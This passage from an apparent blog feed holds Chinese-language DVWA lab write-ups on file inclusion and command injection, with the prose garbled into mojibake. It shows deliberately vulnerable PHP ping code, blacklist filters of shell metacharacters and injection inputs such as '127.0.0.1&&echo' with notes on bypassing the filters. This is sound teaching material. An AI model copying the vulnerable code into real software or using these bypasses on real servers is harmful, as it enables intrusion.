class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ–°å‡½æ•°ï¼š</p><p><strong>fnmatch() å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šæ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚</p><p>è¯­æ³•ï¼šfnmatch(pattern,string,flags)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">pattern</td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æ£€ç´¢çš„æ¨¡å¼ã€‚</td></tr><tr><td align="left">string</td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ã€‚</td></tr><tr><td align="left">flags</td><td align="left">å¯é€‰ã€‚</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è§„å®šåªèƒ½åŒ…å«ä»¥fileå¼€å¤´çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨fileåè®®ç»•è¿‡ã€‚</p><p>fileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬ç”¨æµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ—¶åˆ©ç”¨çš„å°±æ˜¯fileåè®®![6](DVWAâ€”File Inclusion/6.png)</p><p>fileåè®®çš„åŸºæœ¬æ ¼å¼ï¼šfile:///æ–‡ä»¶è·¯å¾„</p><p>ç”±äºfileåè®®è§„å®šåªèƒ½ç”±äºè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼Œå› æ­¤æ­é…æ–‡ä»¶ä¸Šä¼ æ¼æ´æ•ˆæœæä½³ã€‚![7](DVWAâ€”File Inclusion/7.png)</p><h1 id="Impossibleï¼š"><a href="#Impossibleï¼š" class="headerlink" title="Impossibleï¼š"></a>Impossibleï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Impossible File Inclusion Source</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;File Inclusionï¼Œè¯‘ä¸ºæ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´ï¼‰ã€‚æœåŠ¡å™¨å¼€å¯allow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”â€”Command Injection</title>
    <link href="http://example.com/2021/02/25/DVWA%E2%80%94Command%20Injection/"/>
    <id>http://example.com/2021/02/25/DVWA%E2%80%94Command%20Injection/</id>
    <published>2021-02-25T12:24:15.000Z</published>
    <updated>2021-04-06T09:12:34.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>å‘½ä»¤æ³¨å…¥â€”â€”åˆ©ç”¨å¯ä»¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„webåº”ç”¨ï¼Œé€šè¿‡æ„é€ ç‰¹æ®Šå‘½ä»¤å­—ç¬¦ä¸²çš„æ–¹å¼ï¼ŒæŠŠæ¶æ„ä»£ç è¾“å…¥ä¸€ä¸ªç¼–è¾‘åŸŸ(ä¾‹å¦‚ç¼ºä¹æœ‰æ•ˆéªŒè¯çš„è¾“å…¥æ¡†)æ¥æ”¹å˜ç½‘é¡µåŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œæœ€ç»ˆå®ç°æœ¬åº”åœ¨æœåŠ¡ç«¯æ‰èƒ½å·¥ä½œçš„ç³»ç»Ÿå‘½ä»¤ã€‚å‘½ä»¤æ³¨å…¥æ”»å‡»çš„å¸¸è§åœºæ™¯ä¸ºï¼šä»…ä»…éœ€è¦è¾“å…¥æ•°æ®çš„åœºåˆï¼Œæ”»å‡»è€…æ„é€ æ•°æ®åŒæ—¶è¾“å…¥äº†æ¶æ„å‘½ä»¤ä»£ç ï¼Œè€Œç³»ç»Ÿå¯¹æ­¤å¹¶æœªè¿‡æ»¤ï¼Œæ¶æ„å‘½ä»¤ä»£ç ä¸€å¹¶æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–è€…æ­£å¸¸æ•°æ®çš„ç ´åï¼›PHPå‘½ä»¤æ³¨å…¥æ”»å‡»æ¼æ´æ˜¯PHPåº”ç”¨ç¨‹åºä¸­å¸¸è§çš„è„šæœ¬æ¼æ´ä¹‹ä¸€ã€‚å‘½ä»¤æ³¨å…¥å’Œä»£ç æ³¨å…¥ä¸åŒï¼Œä»£ç æ³¨å…¥çš„ç›®çš„åœ¨äºå°†å¤–éƒ¨ä»£ç æ³¨å…¥åº”ç”¨ç¨‹åºæœ¬èº«ï¼Œå¹¶éšç¨‹åºæ‰§è¡Œï¼›å‘½ä»¤æ”»å‡»çš„å¯¹è±¡æ˜¯æœåŠ¡å™¨çš„å®¿ä¸»æœºã€‚å› æ­¤ç”¨æˆ·å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥è¾¾åˆ°å…¥ä¾µç›®çš„ã€‚</p><ul><li><strong><code>&amp;</code>ï¼Œ<code>&amp;&amp;</code>ï¼Œ<code>|</code>ï¼Œ<code>||</code>å‘½ä»¤æ‹¼æ¥ç¬¦çš„åŒºåˆ«</strong>:</li></ul><table><thead><tr><th>A&amp;B</th><th align="center">æ‹¼æ¥ï¼ŒAå’ŒBä¹‹é—´æ— åˆ¶çº¦å…³ç³»</th></tr></thead><tbody><tr><td>A&amp;&amp;B</td><td align="center">Aæ‰§è¡ŒæˆåŠŸï¼Œä¹‹åæ‰ä¼šæ‰§è¡ŒB</td></tr><tr><td>A|B</td><td align="center">Açš„è¾“å‡ºä½œä¸ºBçš„è¾“å…¥</td></tr><tr><td>A||B</td><td align="center">Aæ‰§è¡Œå¤±è´¥ï¼Œä¹‹åæ‰ä¼šæ‰§è¡ŒB</td></tr><tr><td>A;B</td><td align="center">; åˆ†å·è¡¨ç¤ºå‘½ä»¤ä¾æ¬¡æ‰§è¡Œã€‚</td></tr></tbody></table><ul><li><p><strong>windowsç³»ç»Ÿä¸‹å¸¸è§çš„æ‹¼æ¥å‘½ä»¤ï¼š</strong></p><ul><li><p>ipconfig æŸ¥çœ‹æœ¬åœ°ç½‘ç»œ</p></li><li><p>net  user   æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·</p></li><li><p>dir  æŸ¥çœ‹å½“å‰ç›®å½•</p></li><li><p>find æŸ¥æ‰¾åŒ…å«æŒ‡å®šå­—ç¬¦çš„è¡Œ</p></li><li><p>whoami æŸ¥çœ‹ç³»ç»Ÿå½“å‰æœ‰æ•ˆç”¨æˆ·å   </p></li></ul></li></ul><ul><li><strong>Linuxå‘½ä»¤å¤§å…¨</strong>ï¼š<a href="https://www.runoob.com/linux/linux-command-manual.html">https://www.runoob.com/linux/linux-command-manual.html</a></li></ul><h1 id="Low"><a href="#Low" class="headerlink" title="Low:"></a>Low:</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">        <span class="comment">// Get input   </span></span><br><span class="line">        $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];   </span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.   </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;     </span><br><span class="line">            <span class="comment">// Windows     </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping &#x27;</span> . $target );   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">else</span> &#123;     </span><br><span class="line">            <span class="comment">// *nix     </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping -c 4 &#x27;</span> . $target );   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">// Feedback for the end user   </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ–°å‡½æ•°ï¼š</p><ul><li><strong>php_uname()å‡½æ•°</strong></li></ul><p>åŠŸèƒ½ï¼šè¿”å›è¿è¡Œ PHP çš„ç³»ç»Ÿçš„æœ‰å…³ä¿¡æ¯ã€‚</p><p>è¯­æ³•ï¼šphp_uname ([ string $mode = â€œaâ€ ] )</p><p>   å…¶ä¸­ï¼Œ<code>mode</code> æ˜¯å•ä¸ªå­—ç¬¦ï¼Œç”¨äºå®šä¹‰è¦è¿”å›ä»€ä¹ˆä¿¡æ¯ï¼š</p><ol><li><p><code>&#39;a&#39;</code>ï¼šæ­¤ä¸ºé»˜è®¤ã€‚åŒ…å«åºåˆ— <code>&quot;s n r v m&quot;</code> é‡Œçš„æ‰€æœ‰æ¨¡å¼ã€‚</p></li><li><p><code>&#39;s&#39;</code>ï¼šæ“ä½œç³»ç»Ÿåç§°ã€‚ä¾‹å¦‚ï¼š <code>FreeBSD</code>ã€‚</p></li><li><p><code>&#39;n&#39;</code>ï¼šä¸»æœºåã€‚ä¾‹å¦‚ï¼š <code>localhost.example.com</code>ã€‚</p></li><li><p><code>&#39;r&#39;</code>ï¼šç‰ˆæœ¬åç§°ï¼Œä¾‹å¦‚ï¼š <code>5.1.2-RELEASE</code>ã€‚</p></li><li><p><code>&#39;v&#39;</code>ï¼šç‰ˆæœ¬ä¿¡æ¯ã€‚æ“ä½œç³»ç»Ÿä¹‹é—´æœ‰å¾ˆå¤§çš„ä¸åŒã€‚</p></li><li><p><code>&#39;m&#39;</code>ï¼šæœºå™¨ç±»å‹ã€‚ä¾‹å¦‚ï¼š<code>i386</code>ã€‚ </p></li></ol><p>   <strong>shell_exec()å‡½æ•°</strong></p><p>   åŠŸèƒ½ï¼šé€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚ï¼ˆè¡¥å……ï¼š<code>Shell æ˜¯æŒ‡ä¸€ç§åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚</code>ï¼‰</p><p>   è¯­æ³•ï¼šshell_exec ( string <code>$cmd</code> )</p><p>   å…¶ä¸­å‚æ•°cmdä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>æŸ¥çœ‹æºç æˆ‘ä»¬å¯çŸ¥ï¼ŒæœåŠ¡å™¨é€šè¿‡<strong>stristr</strong>å’Œ<strong>php_uname</strong>ä¸¤ä¸ªå‡½æ•°æ¥åˆ¤æ–­æ“ä½œç³»ç»Ÿï¼Œæ‰§è¡Œä¸åŒçš„pingå‘½ä»¤ã€‚åŒæ—¶æœåŠ¡å™¨æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„IPåœ°å€åšä»»ä½•çš„è¿‡æ»¤å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„çš„å‘½ä»¤æ‰§è¡Œåˆ†éš”ç¬¦æ¥æ‰§è¡Œæˆ‘ä»¬çš„æŒ‡ä»¤ã€è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</p><p>ä¾‹å¦‚è¾“å…¥ï¼š127.0.0.1&amp;&amp;echo â€œhello worldâ€</p><p>![1](DVWAâ€”Command Injection/1.png)</p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium:"></a>Medium:</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å‡½æ•°ï¼š</p><ul><li><p><strong>str_replace()å‡½æ•°</strong></p><p><strong>åŠŸèƒ½ï¼š</strong>æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><p>è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š</p><ul><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚</li><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚</li><li>å¦‚æœåŒæ—¶éœ€è¦å¯¹æŸä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™çš„å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚</li><li>å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚</li></ul><p>è¡¥å……ï¼šè¯¥å‡½æ•°æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ str_ireplace() å‡½æ•°æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æœç´¢ã€‚</p><p><strong>è¯­æ³•ï¼š</strong>str_ireplace(<em>find,replace,string,count</em>)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚</td></tr><tr><td align="left"><em>replace</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ›¿æ¢ <em>find</em> ä¸­çš„å€¼çš„å€¼ã€‚</td></tr><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>count</em></td><td align="left">å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚</td></tr></tbody></table></li><li><p><strong>array_keys() å‡½æ•°</strong></p><p><strong>åŠŸèƒ½ï¼š</strong>è¿”å›åŒ…å«æ•°ç»„ä¸­æ‰€æœ‰é”®åçš„ä¸€ä¸ªæ–°æ•°ç»„ã€‚</p><p><strong>è¯­æ³•</strong>ï¼šarray_keys(<em>array,value,strict</em>)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚</td></tr><tr><td align="left"><em>value</em></td><td align="left">å¯é€‰ã€‚æ‚¨å¯ä»¥æŒ‡å®šé”®å€¼ï¼Œç„¶ååªæœ‰è¯¥é”®å€¼å¯¹åº”çš„é”®åä¼šè¢«è¿”å›ã€‚</td></tr><tr><td align="left"><em>strict</em></td><td align="left">å¯é€‰ã€‚ä¸ value å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚                                                                                                         å¯èƒ½çš„å€¼ï¼štrue - è¿”å›å¸¦æœ‰æŒ‡å®šé”®å€¼çš„é”®åã€‚ä¾èµ–ç±»å‹ï¼Œæ•°å­— 5 ä¸å­—ç¬¦ä¸² â€œ5â€ æ˜¯ä¸åŒçš„ï¼›                                   false - é»˜è®¤å€¼ã€‚ä¸ä¾èµ–ç±»å‹ï¼Œæ•°å­— 5 ä¸å­—ç¬¦ä¸² â€œ5â€ æ˜¯ç›¸åŒçš„ã€‚</td></tr></tbody></table></li></ul><p>â€‹       èœé¸Ÿå®ä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;array(&quot;Volvo&quot;&#x3D;&gt;&quot;XC90&quot;,&quot;BMW&quot;&#x3D;&gt;&quot;X5&quot;,&quot;Toyota&quot;&#x3D;&gt;&quot;Highlander&quot;);</span><br><span class="line">print_r(array_keys($a));</span><br><span class="line">?&gt;</span><br><span class="line">è¿è¡Œç»“æœï¼šArray ( [0] &#x3D;&gt; Volvoï¼Œ[1] &#x3D;&gt; BMW ï¼Œ[2] &#x3D;&gt; Toyota )</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç æˆ‘ä»¬å‘ç°æœåŠ¡å™¨è®¾ç½®äº†é»‘åå•è¿‡æ»¤äº†å­—ç¬¦<code>&amp;&amp;</code>å’Œ<code>;</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ˜¯ç”¨<code>&amp;</code>æ›¿ä»£ï¼Œ<code>&amp;;&amp;</code>ç»•è¿‡çš„æ–¹å¼é¿å¼€é»‘åå•ã€‚</p><h1 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹é»‘åå•è¿›è¡Œäº†è¡¥å……ï¼Œä½†æ˜¯å‘ç°é»‘åå•ç¦ç”¨çš„æ˜¯<code>&#39;| &#39;</code>(è¿™ä¸ªé‡Œé¢æœ‰ä¸ªç©ºæ ¼)ï¼Œè€Œä¸æ˜¯<code>&#39;|&#39;</code>ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´<code>|</code>å‘½ä»¤æŒ‡ä»¤ç¬¦æœªè¢«ç¦ç”¨ã€‚</p><h1 id="Impossibleï¼š"><a href="#Impossibleï¼š" class="headerlink" title="Impossibleï¼š"></a>Impossibleï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span 